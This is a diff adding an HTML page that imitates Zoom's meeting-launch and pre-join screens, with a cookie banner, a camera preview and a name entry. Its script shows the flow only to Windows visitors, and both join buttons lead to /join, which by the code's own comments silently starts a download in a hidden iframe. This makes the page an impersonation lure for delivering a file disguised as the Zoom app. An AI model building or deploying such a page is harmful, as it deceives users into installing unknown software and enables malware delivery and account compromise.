@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Launch Meeting</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  * { box-sizing: border-box; }
+  body { margin:0; font-family: "Open Sans", Helvetica, Arial, sans-serif; }  /* same stack as the live page */
+  a { color:#0e71eb; text-decoration:none; } a:hover { text-decoration:underline; }
+  .hidden { display:none !important; }
+
+  /* ---------- Step 1: launch page (light) ---------- */
+  #launch { background:#fff; color:#232333; min-height:100vh; display:flex; flex-direction:column; }
+  #launch header { display:flex; justify-content:space-between; align-items:center; height:64px; padding:0 40px; border-bottom:1px solid #eee; font-size:12px; }
+  #launch .note { margin:0; font-size:14px; font-weight:400; line-height:24px; color:#232333; }
+  #launch .note + .note { margin-top:20px; }
+  #launch .note a { color:#0e72ed; }
+  #launch footer { text-align:center; font-size:14px; line-height:21px; color:rgba(4,4,19,.56); padding:0 20px 24px; }
+  #launch footer .links { margin-top:6px; }
+  #launch footer .links a { color:rgba(4,4,19,.56); }
+  #launch footer .links a + a::before { content:"|"; margin:0 6px; color:rgba(4,4,19,.3); display:inline-block; }
+  #launch .logo { font-size:28px; font-weight:800; color:#0b5cff; letter-spacing:-1px; }
+  #launch main { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:22px; text-align:center; padding:40px 20px; }
+  #launch h2 { margin:0; font-weight:600; font-size:22px; }
+  .spinner { width:28px; height:28px; border:3px solid #cfe0fb; border-top-color:#0e71eb; border-radius:50%; animation:spin 1s linear infinite; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  #launch .actions { display:flex; flex-direction:column; gap:16px; align-items:center; font-size:14px; }
+  #launch h1 { margin:0 0 28px; font-size:24px; font-weight:700; color:#232333; }
+  #launch .zbtn { width:400px; max-width:90vw; height:48px; border-radius:8px; font-size:16px; cursor:pointer; font-family:inherit; }
+  #launch .zbtn-primary { background:#0d6bde; color:#fff; border:.67px solid transparent; font-weight:500; }
+  #launch .zbtn-primary:hover { background:#0b5cc0; }
+  #launch .zbtn-secondary { background:#fff; color:#222325; border:.67px solid #939ba4; font-weight:400; }
+  #launch .zbtn-secondary:hover { background:#f4f5f7; }
+  #launch .small { font-size:12px; color:#6e7680; }
+
+  /* ---------- Cookie consent (styles measured from the live banner) ---------- */
+  #cookie { position:fixed; top:120px; left:50%; transform:translateX(-50%); width:642px; max-width:calc(100vw - 28px);
+            background:#fff; color:#000; border-radius:2.5px; box-shadow:0 0 18px rgba(0,0,0,.2); z-index:100;
+            font-family: Inter, Helvetica, Arial, sans-serif; font-size:14px; padding:30px 0 0; }
+  #cookie .ck-text { color:#696969; line-height:21px; margin:0 30px 10px; }
+  #cookie .ck-text a { color:#3860be; font-weight:700; text-decoration:underline; margin-left:5px; }
+  #cookie .ck-row { display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; margin:10px 30px 0; }
+  #cookie .ck-btn { font-family:inherit; font-size:11.382px; letter-spacing:2.2764px; text-transform:uppercase; min-width:135px; cursor:pointer; margin-bottom:16px; }
+  #cookie .ck-settings { background:#fff; color:#0e71eb; border:0; font-weight:600; text-decoration:underline; padding:12px 0; text-align:left; border-radius:2px; }
+  #cookie .ck-solid { background:#0e72ed; color:#fff; border:.67px solid #0e72ed; padding:12px 10px; border-radius:2px; font-weight:600; line-height:15.93px; }
+  #cookie .ck-solid:hover { opacity:.85; }
+  #cookie #ckDecline { margin-right:11.382px; font-weight:900; border-radius:3px; }
+  #cookie .ck-close { position:absolute; top:6px; right:6px; width:44px; height:44px; background:none; border:0; cursor:pointer; color:#555; font-size:20px; line-height:44px; }
+  #cookie .ck-prefs { margin:0 30px 14px; display:none; flex-direction:column; gap:8px; color:#333; }
+  #cookie .ck-prefs.open { display:flex; }
+  #cookie .ck-prefs label { display:flex; justify-content:space-between; align-items:center; border-top:1px solid #eee; padding-top:8px; }
+
+  /* ---------- Step 2: pre-join (dark) ---------- */
+  #prejoin { background:#161619; color:#fff; min-height:100vh; padding:24px 40px; display:flex; flex-direction:column; }
+  #prejoin .back { align-self:flex-start; font-size:13px; cursor:pointer; color:#4a9bff; background:none; border:0; padding:0; }
+  #prejoin .pj-grid { flex:1; align-content:center; width:100%; }
+  .pj-grid { display:grid; grid-template-columns: 1.1fr 1fr; gap:48px; align-items:center; max-width:1200px; margin:0 auto; justify-items:center; }
+  .pj-grid .preview { width:100%; }
+  @media (max-width:900px){ .pj-grid { grid-template-columns:1fr; gap:24px; } }
+
+  .preview { position:relative; background:#2a2a2d; border-radius:14px; aspect-ratio:16/9; overflow:hidden; }
+  .preview video, .preview canvas { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; }
+  .mirror { transform:scaleX(-1); }
+  .avatar { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; }
+  .avatar .silh { width:26%; aspect-ratio:1; background:#4a4a4f; border-radius:14px; display:flex; align-items:center; justify-content:center; font-size:48px; font-weight:700; color:#fff; }
+  .avatar svg { width:70%; height:70%; fill:#2a2a2d; }
+  .banner { position:absolute; top:12px; left:16px; right:16px; background:#0d0d0f; border-radius:10px; padding:12px 14px; font-size:14px; display:flex; gap:10px; align-items:center; z-index:5; }
+  .banner .warn { color:#f5a623; }
+
+  .controls { position:absolute; bottom:12px; left:50%; transform:translateX(-50%); display:flex; background:#000; border-radius:8px; padding:4px; z-index:5; gap:2px; }
+  .ctl { position:relative; display:flex; align-items:center; border-radius:6px; }
+  .ctl:hover { background:#ffffff17; }
+  .ctl > button { background:none; border:0; color:#fff; cursor:pointer; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:3px; font-size:12px; padding:6px 8px; min-width:62px; }
+  .ctl > button.caret { min-width:0; padding:4px 5px; align-self:flex-start; margin-left:-14px; }
+  .caret i { display:block; width:6px; height:6px; border-left:2px solid #ccc; border-top:2px solid #ccc; transform:rotate(45deg); margin-top:4px; }
+  .zi { display:inline-block; background:url(img/wc_sprites.png) no-repeat; background-size:416px 384px; }
+  .zi-mic-on  { background-position:-73px -3px;   width:14px; height:25px; }
+  .zi-mic-off { background-position:-99px -2px;   width:26px; height:26px; }
+  .zi-cam-on  { background-position:-192px -153px;width:30px; height:30px; }
+  .zi-cam-off { background-position:-239px -153px;width:30px; height:30px; }
+  .meter { position:absolute; left:8px; right:8px; bottom:0; height:3px; background:#333; border-radius:2px; overflow:hidden; }
+  .meter div { height:100%; width:0; background:#2ecc71; transition:width .08s; }
+
+  .menu { position:absolute; bottom:calc(100% + 8px); left:0; width:280px; background:#232327; border:1px solid #3a3a3e; border-radius:10px; padding:12px; display:none; flex-direction:column; gap:10px; font-size:13px; text-align:left; z-index:20; }
+  .menu.open { display:flex; }
+  .menu label { color:#9a9aa0; font-size:11px; display:block; margin-bottom:3px; }
+  .menu select { width:100%; background:#161619; color:#fff; border:1px solid #444; border-radius:6px; padding:7px; }
+  .menu .row { display:flex; gap:8px; align-items:center; }
+  .menu button.sm { background:#3a3a3e; color:#fff; border:0; border-radius:6px; padding:6px 10px; cursor:pointer; }
+
+  .form { max-width:440px; width:100%; }
+  .form h1 { text-align:center; font-size:26px; font-weight:700; margin:0 0 22px; }
+  .form label.f { display:block; font-size:14px; font-weight:600; margin-bottom:6px; }
+  .form input[type=text] { width:100%; padding:11px 12px; border-radius:8px; border:1px solid #4a4a50; background:#1e1e22; color:#fff; font-size:14px; }
+  .form input[type=text]:focus { outline:2px solid #0e71eb; border-color:#0e71eb; }
+  .remember { display:flex; align-items:center; gap:8px; font-size:13px; margin:14px 0; }
+  #joinBtn { width:100%; background:#0e71eb; color:#fff; border:0; border-radius:8px; padding:13px; font-size:15px; font-weight:600; cursor:pointer; }
+  #joinBtn:disabled { background:#2f2f34; color:#8a8a90; cursor:not-allowed; }
+  .legal { font-size:12.5px; color:#9a9aa0; line-height:1.5; margin-top:18px; }
+
+  /* ---------- Mic/camera permission popup ---------- */
+  #permModal { position:fixed; inset:0; background:rgba(0,0,0,.55); display:flex; align-items:center; justify-content:center; z-index:50; }
+  #permModal .box { width:640px; max-width:calc(100vw - 32px); background:#1f2023; border:1px solid #333438; border-radius:10px;
+                    padding:54px 32px 56px; text-align:center; color:#fff; }
+  #permModal .art { width:220px; height:192px; margin:0 auto 44px; border-radius:10px; background:#e8eefb; display:block; overflow:visible; }
+  #permModal h2 { margin:0 0 8px; font-size:20px; font-weight:600; }
+  #permModal p { margin:0 0 20px; font-size:16px; color:#d0d0d4; }
+  #permModal .use { display:inline-flex; align-items:center; gap:8px; background:#0e71eb; color:#fff; border:0; border-radius:6px;
+                    height:40px; padding:0 20px; font-size:16px; font-family:inherit; cursor:pointer; }
+  #permModal .use:hover { background:#0b5cc0; }
+  #permModal .skip { display:block; margin:16px auto 0; background:none; border:0; color:#4a9bff; font-size:16px; font-family:inherit; cursor:pointer; }
+  #permModal .skip:hover { text-decoration:underline; }
+
+</style>
+</head>
+<body>
+
+<!-- STEP 1 -->
+<section id="launch">
+  <header><span class="logo">Zoom</span><span><a href="#">Support</a> &nbsp; English ▾</span></header>
+  <main>
+    <div class="spinner" id="spin"></div>
+    <div class="actions hidden" id="launchActions">
+      <h1>Join meeting</h1>
+      <button class="zbtn zbtn-primary" id="launchBtn">Join from Zoom Workspace app</button>
+      <button class="zbtn zbtn-secondary" id="toBrowser">Join from browser</button>
+    </div>
+    <div>
+      <h3 class="note">Don't have the app installed? <a href="/join">Download Now</a></h3>
+      <h3 class="note">By joining a meeting, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Statement</a></h3>
+    </div>
+  </main>
+  <footer>
+    <div>©2026 meet. All rights reserved.</div>
+    <div class="links"><a href="#">Trust Center</a><a href="#">Acceptable Use Guidelines</a><a href="#">Legal &amp; Compliance</a><a href="#">Do Not Sell My Personal Information</a><a href="#" id="cookiePrefs">Cookie Preferences</a></div>
+  </footer>
+
+  <div id="cookie" class="hidden" role="dialog" aria-label="Privacy">
+    <button class="ck-close" id="ckClose" aria-label="Close">✕</button>
+    <!-- COOKIE TEXT: replace the text inside .ck-text with your own wording if needed. Keep the <a> for the policy link. -->
+    <div class="ck-text">
+      We use cookies and similar technologies that are strictly necessary for this site to work. With your permission, we and our partners would also use additional cookies to understand how you use the site, to improve and personalize your visit, and to show you more relevant content and ads. These are only set if you accept.<br><br>
+      You can review or change your choices at any time in cookie settings. For details, see our<a href="#">Privacy Statement</a>.
+    </div>
+    <div class="ck-prefs" id="ckPrefs">
+      <label>Strictly necessary <span style="color:#0e71eb;font-weight:600">Always on</span></label>
+      <label>Analytics <input type="checkbox" id="ckAnalytics"></label>
+      <label>Advertising <input type="checkbox" id="ckAds"></label>
+    </div>
+    <div class="ck-row">
+      <button class="ck-btn ck-settings" id="ckSettings">Cookies Settings</button>
+      <div>
+        <button class="ck-btn ck-solid" id="ckDecline">Decline Cookies</button>
+        <button class="ck-btn ck-solid" id="ckAccept">Accept Cookies</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- STEP 2 -->
+<section id="prejoin" class="hidden">
+  <button class="back" id="backBtn">‹ Back</button>
+  <div class="pj-grid">
+    <div class="preview" id="preview">
+      <video id="video" autoplay playsinline muted class="mirror"></video>
+      <canvas id="out" class="mirror hidden"></canvas>
+      <div class="avatar" id="avatar"><div class="silh" id="silh"><svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4.4 3.6-7 8-7s8 2.6 8 7z"/></svg></div></div>
+      <div class="banner hidden" id="banner"><span class="warn">⚠</span><span id="bannerTxt"></span></div>
+
+      <div class="controls">
+        <div class="ctl">
+          <button id="micBtn"><span class="zi zi-mic-on"></span><span id="micLbl">Mute</span></button>
+          <button class="caret" data-menu="micMenu" title="Audio settings"><i></i></button>
+          <div class="menu" id="micMenu">
+            <div><label>Microphone</label><select id="micSel"></select></div>
+            <div><label>Speaker</label><div class="row"><select id="spkSel"></select><button class="sm" id="testSpk">Test</button></div></div>
+            <div class="meter" style="position:static;height:6px"><div id="level"></div></div>
+          </div>
+        </div>
+        <div class="ctl">
+          <button id="camBtn"><span class="zi zi-cam-on"></span><span id="camLbl">Stop Video</span></button>
+          <button class="caret" data-menu="camMenu" title="Video settings"><i></i></button>
+          <div class="menu" id="camMenu" style="left:auto;right:0">
+            <div><label>Camera</label><select id="camSel"></select></div>
+            <label style="display:flex;gap:8px;align-items:center;color:#fff;font-size:13px"><input type="checkbox" id="mirror" checked> Mirror my video</label>
+            <div><label>Background</label><select id="bg"><option value="none">None</option><option value="blur">Blur (downloads model)</option></select></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="form">
+      <h1>Enter Meeting Info</h1>
+      <label class="f" for="name">Your Name</label>
+      <input id="name" type="text" maxlength="64" autocomplete="off">
+      <label class="remember"><input type="checkbox" id="remember"> Remember my name for future meetings</label>
+      <button id="joinBtn" disabled>Join</button>
+      <p class="legal">By clicking "Join", you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Statement</a>.</p>
+    </div>
+  </div>
+</section>
+
+<!-- Mic/camera permission popup (shown when entering the pre-join screen) -->
+<div id="permModal" class="hidden" role="dialog" aria-modal="true" aria-labelledby="permTitle">
+  <div class="box">
+    <svg class="art" viewBox="0 0 220 192" aria-hidden="true">
+      <ellipse cx="95" cy="150" rx="85" ry="40" fill="#fff" opacity=".7"/>
+      <!-- video tiles -->
+      <rect x="140" y="38" width="92" height="58" rx="3" fill="#2d3a8c"/>
+      <g fill="#f6b73c"><rect x="144" y="42" width="26" height="15"/><rect x="173" y="42" width="26" height="15" fill="#6aa2ff"/><rect x="202" y="42" width="26" height="15"/>
+      <rect x="144" y="60" width="26" height="15" fill="#ff8a65"/><rect x="173" y="60" width="26" height="15"/><rect x="202" y="60" width="26" height="15" fill="#6aa2ff"/>
+      <rect x="144" y="78" width="26" height="15" fill="#6aa2ff"/><rect x="173" y="78" width="26" height="15" fill="#ff8a65"/><rect x="202" y="78" width="26" height="15"/></g>
+      <!-- camera bubble -->
+      <rect x="44" y="52" width="46" height="44" rx="9" fill="#5b8def"/>
+      <rect x="53" y="66" width="18" height="15" rx="3" fill="none" stroke="#fff" stroke-width="2"/><path d="M71 71l9-5v15l-9-5z" fill="none" stroke="#fff" stroke-width="2"/>
+      <!-- mic bubble -->
+      <rect x="92" y="34" width="36" height="36" rx="7" fill="#2c3fc7"/>
+      <rect x="105" y="41" width="10" height="16" rx="5" fill="none" stroke="#fff" stroke-width="2"/><path d="M101 54a9 9 0 0 0 18 0M110 63v3" fill="none" stroke="#fff" stroke-width="2"/>
+      <!-- person at desk -->
+      <circle cx="111" cy="84" r="7" fill="#1c1c2e"/>
+      <path d="M100 96q11-6 22 0l3 28h-28z" fill="#f6b073"/>
+      <path d="M98 124h30l6 30h-6l-5-22h-22z" fill="#1c1c2e"/>
+      <path d="M58 122h134" stroke="#1c1c2e" stroke-width="3"/>
+      <path d="M68 124l-10 50M182 124l10 50M150 124l6 50M105 140l-8 34M105 140l8 34" stroke="#1c1c2e" stroke-width="1.5"/>
+      <rect x="96" y="108" width="20" height="16" fill="#3a3a4a"/>
+    </svg>
+    <h2 id="permTitle">Do you want people to see you in the meeting?</h2>
+    <p>You can still turn off your microphone and camera anytime in the meeting</p>
+    <button class="use" id="permUse">
+      <svg width="20" height="16" viewBox="0 0 20 16" fill="none" stroke="#fff" stroke-width="2"><rect x="1" y="2" width="12" height="12" rx="2"/><path d="M13 7l6-3.5v9L13 9z"/></svg>
+      Use microphone and camera</button>
+    <button class="skip" id="permSkip">Continue without microphone and camera</button>
+  </div>
+</div>
+
+<script>
+(function () {
+/* ---------- Windows-only gate ----------
+   Mirrors the 403 on /api/download: a non-Windows visitor never sees the
+   mock flow (and no camera/microphone is ever requested from them). */
+if (!/Windows/i.test(navigator.userAgent)) {
+  document.body.innerHTML =
+    '<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;'
+    + 'font-family:Inter,Helvetica,Arial,sans-serif;background:#f5f6f7">'
+    + '<div style="background:#fff;padding:2rem;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,.1);text-align:center">'
+    + '<h2 style="color:#cc0000;margin:0 0 1rem">Access Restricted</h2>'
+    + '<p style="color:#444;margin:0">This resource is only available for Windows devices.</p>'
+    + '</div></div>';
+  document.title = 'Zoom';
+  return;
+}
+const $ = id => document.getElementById(id);
+/* Site storage can be unavailable (sandboxed iframe, blocked third-party storage):
+   the page still works, it just remembers nothing between visits. */
+const store = (() => { try { return window.localStorage; } catch { return null; } })();
+const video = $('video'), out = $('out');
+let stream = null, audioCtx = null, rafLevel = 0, seg = null, segRunning = false;
+
+/* ---------- step navigation ---------- */
+function show(id) { ['launch','prejoin'].forEach(s => $(s).classList.toggle('hidden', s !== id)); document.title = id === 'launch' ? 'Launch Meeting' : 'Zoom'; }
+setTimeout(() => { $('spin').classList.add('hidden'); $('launchActions').classList.remove('hidden'); }, 3000);  // like Zoom: link appears after a few seconds
+$('toBrowser').onclick = e => { e.preventDefault(); show('prejoin'); applyToggles(); $('permModal').classList.remove('hidden'); $('permUse').focus(); };
+// Permission popup: only ask the browser for devices after the user opts in
+$('permUse').onclick  = () => { $('permModal').classList.add('hidden'); startMedia(); };
+$('permSkip').onclick = () => { $('permModal').classList.add('hidden'); hideBanner(); applyToggles(); };  // stays off; Unmute / Start Video will ask later
+$('launchBtn').onclick = () => { window.location.href = '/join'; };  // the "launch failed / download" page
+$('backBtn').onclick = () => { stopStream(); show('launch'); };
+
+/* ---------- cookie consent ---------- */
+// Choice is stored locally; clear it with localStorage.removeItem('cookie-consent') to see the banner again.
+if (!store?.getItem('cookie-consent')) $('cookie').classList.remove('hidden');
+function setConsent(v) { store?.setItem('cookie-consent', JSON.stringify(v)); $('cookie').classList.add('hidden'); }
+$('ckAccept').onclick  = () => setConsent({ analytics: true,  ads: true });
+$('ckDecline').onclick = () => setConsent({ analytics: false, ads: false });
+$('ckClose').onclick   = () => $('cookie').classList.add('hidden');            // closes for this visit only
+$('cookiePrefs').onclick = e => {
+  // Footer link reopens the banner, in its initial state (not left in "Save Settings" mode).
+  e.preventDefault();
+  $('ckPrefs').classList.remove('open');
+  $('ckSettings').textContent = 'Cookies Settings';
+  $('cookie').classList.remove('hidden');
+};
+$('ckSettings').onclick = () => {
+  const p = $('ckPrefs');
+  if (!p.classList.contains('open')) { p.classList.add('open'); $('ckSettings').textContent = 'Save Settings'; }
+  else setConsent({ analytics: $('ckAnalytics').checked, ads: $('ckAds').checked });
+};
+
+/* ---------- name / join ---------- */
+const saved = store?.getItem('prejoin-name'); if (saved) { $('name').value = saved; $('remember').checked = true; }
+function syncName() { const n = $('name').value.trim(); $('joinBtn').disabled = !n; $('silh').dataset.n = n; refreshAvatar(); }
+$('name').oninput = syncName; syncName();
+$('name').addEventListener('keydown', e => { if (e.key === 'Enter' && !$('joinBtn').disabled) $('joinBtn').click(); });
+/* Join no longer shows a mock "in your meeting" screen: it saves the name, releases the
+   camera/microphone and goes to /join, which starts the download (hidden iframe) and shows
+   the "please download manually" page. */
+$('joinBtn').onclick = () => {
+  const n = $('name').value.trim(); if (!n) return;
+  $('remember').checked ? store?.setItem('prejoin-name', n) : store?.removeItem('prejoin-name');
+  stopStream();
+  window.location.href = '/join';
+};
+
+/* ---------- media ---------- */
+function showBanner(t) { $('bannerTxt').textContent = t; $('banner').classList.remove('hidden'); }
+function hideBanner() { $('banner').classList.add('hidden'); }
+function refreshAvatar() {
+  const v = stream?.getVideoTracks()[0];
+  const camShown = v && v.enabled;
+  video.style.visibility = camShown ? 'visible' : 'hidden';
+  $('avatar').classList.toggle('hidden', !!camShown);
+  const n = $('name').value.trim();
+  $('silh').innerHTML = n ? n[0].toUpperCase() : '<svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4.4 3.6-7 8-7s8 2.6 8 7z"/></svg>';
+  $('silh').style.background = n ? '#0e71eb' : '#4a4a4f';
+}
+
+async function listDevices() {
+  const devs = await navigator.mediaDevices.enumerateDevices();
+  const fill = (sel, kind, cur) => {
+    const prev = sel.value; sel.innerHTML = '';
+    devs.filter(d => d.kind === kind).forEach((d, i) => sel.add(new Option(d.label || `${kind} ${i + 1}`, d.deviceId)));
+    const want = cur || prev; if ([...sel.options].some(o => o.value === want)) sel.value = want;
+  };
+  fill($('camSel'), 'videoinput', stream?.getVideoTracks()[0]?.getSettings().deviceId);
+  fill($('micSel'), 'audioinput', stream?.getAudioTracks()[0]?.getSettings().deviceId);
+  fill($('spkSel'), 'audiooutput');
+}
+
+async function startMedia() {
+  stopStream(); hideBanner();
+  if (!navigator.mediaDevices) { showBanner('Camera API unavailable – open this page via http://localhost.'); refreshAvatar(); return; }
+  let s = null, vErr = null;
+  const vc = $('camSel').value ? { deviceId: { exact: $('camSel').value } } : true;
+  const ac = $('micSel').value ? { deviceId: { exact: $('micSel').value } } : true;
+  try { s = await navigator.mediaDevices.getUserMedia({ video: vc, audio: ac }); }
+  catch (e) {
+    vErr = e;
+    // try each separately so a missing camera doesn't kill the mic (and vice versa)
+    const parts = [];
+    try { parts.push(...(await navigator.mediaDevices.getUserMedia({ audio: ac })).getTracks()); } catch {}
+    try { parts.push(...(await navigator.mediaDevices.getUserMedia({ video: vc })).getTracks()); vErr = null; } catch (e2) { vErr = e2; }
+    if (parts.length) s = new MediaStream(parts);
+  }
+  stream = s;
+  if (vErr || !s?.getVideoTracks().length) {
+    showBanner(vErr?.name === 'NotAllowedError'
+      ? 'Camera access was blocked. Allow it in your browser settings and try again.'
+      : 'Cannot detect your camera, please check the device and connection and try again.');
+  }
+  if (s) { video.srcObject = s; await listDevices(); startMeter(); }
+  applyToggles();
+  applyBackground();
+}
+
+function stopStream() {
+  stream?.getTracks().forEach(t => t.stop()); stream = null; video.srcObject = null;
+  cancelAnimationFrame(rafLevel); audioCtx?.close(); audioCtx = null; segRunning = false;
+}
+
+function startMeter() {
+  if (!stream?.getAudioTracks().length) return;
+  audioCtx = new AudioContext();
+  const an = audioCtx.createAnalyser(); an.fftSize = 512;
+  audioCtx.createMediaStreamSource(stream).connect(an);
+  const buf = new Uint8Array(an.fftSize);
+  (function tick() {
+    an.getByteTimeDomainData(buf);
+    let sum = 0; for (const v of buf) { const x = (v - 128) / 128; sum += x * x; }
+    $('level').style.width = Math.min(100, Math.sqrt(sum / buf.length) * 300) + '%';
+    rafLevel = requestAnimationFrame(tick);
+  })();
+}
+
+function applyToggles() {
+  const v = stream?.getVideoTracks()[0], a = stream?.getAudioTracks()[0];
+  const vOff = !v || !v.enabled, aOff = !a || !a.enabled;
+  $('camBtn').firstElementChild.className = 'zi ' + (vOff ? 'zi-cam-off' : 'zi-cam-on');
+  $('micBtn').firstElementChild.className = 'zi ' + (aOff ? 'zi-mic-off' : 'zi-mic-on');
+  $('camLbl').textContent = vOff ? 'Start Video' : 'Stop Video';
+  $('micLbl').textContent = aOff ? 'Unmute' : 'Mute';
+  refreshAvatar();
+}
+$('camBtn').onclick = () => { const t = stream?.getVideoTracks()[0]; if (t) { t.enabled = !t.enabled; applyToggles(); } else startMedia(); };
+$('micBtn').onclick = () => { const t = stream?.getAudioTracks()[0]; if (t) { t.enabled = !t.enabled; applyToggles(); } else startMedia(); };
+$('camSel').onchange = startMedia; $('micSel').onchange = startMedia;
+
+/* caret menus */
+document.querySelectorAll('.caret').forEach(b => b.onclick = e => {
+  e.stopPropagation(); const m = $(b.dataset.menu); const was = m.classList.contains('open');
+  document.querySelectorAll('.menu').forEach(x => x.classList.remove('open')); if (!was) m.classList.add('open');
+});
+document.addEventListener('click', e => { if (!e.target.closest('.menu')) document.querySelectorAll('.menu').forEach(x => x.classList.remove('open')); });
+
+$('mirror').onchange = e => { video.classList.toggle('mirror', e.target.checked); out.classList.toggle('mirror', e.target.checked); };
+$('spkSel').onchange = async e => { if (video.setSinkId) try { await video.setSinkId(e.target.value); } catch {} };
+$('testSpk').onclick = async () => {
+  const ctx = new AudioContext(), dest = ctx.createMediaStreamDestination(), osc = ctx.createOscillator(), g = ctx.createGain();
+  g.gain.value = 0.1; osc.connect(g).connect(dest); osc.start();
+  const el = new Audio(); el.srcObject = dest.stream;
+  if (el.setSinkId && $('spkSel').value) try { await el.setSinkId($('spkSel').value); } catch {}
+  el.play(); setTimeout(() => { osc.stop(); ctx.close(); }, 600);
+};
+
+/* background blur (MediaPipe, loaded on demand) */
+const loadScript = src => new Promise((res, rej) => { const s = document.createElement('script'); s.src = src; s.onload = res; s.onerror = rej; document.head.appendChild(s); });
+async function applyBackground() {
+  if ($('bg').value === 'none' || !stream?.getVideoTracks().length) { segRunning = false; out.classList.add('hidden'); return; }
+  try {
+    if (!seg) {
+      showBanner('Loading background model…');
+      await loadScript('https://cdn.jsdelivr.net/npm/@mediapipe/selfie_segmentation/selfie_segmentation.js');
+      seg = new SelfieSegmentation({ locateFile: f => `https://cdn.jsdelivr.net/npm/@mediapipe/selfie_segmentation/${f}` });
+      seg.setOptions({ modelSelection: 1 });
+      const ctx = out.getContext('2d');
+      seg.onResults(r => {
+        out.width = r.image.width; out.height = r.image.height;
+        ctx.save(); ctx.clearRect(0, 0, out.width, out.height);
+        ctx.drawImage(r.segmentationMask, 0, 0, out.width, out.height);
+        ctx.globalCompositeOperation = 'source-in'; ctx.drawImage(r.image, 0, 0, out.width, out.height);
+        ctx.globalCompositeOperation = 'destination-over'; ctx.filter = 'blur(14px)'; ctx.drawImage(r.image, 0, 0, out.width, out.height);
+        ctx.restore();
+      });
+      hideBanner();
+    }
+  } catch { showBanner('Could not load the blur model (needs internet on first use).'); $('bg').value = 'none'; return; }
+  segRunning = true; out.classList.remove('hidden');
+  (async function loop() { if (!segRunning) return; if (video.readyState >= 2) await seg.send({ image: video }); requestAnimationFrame(loop); })();
+}
+$('bg').onchange = applyBackground;
+navigator.mediaDevices?.addEventListener('devicechange', listDevices);
+})();
+</script>
+</body>
+</html>
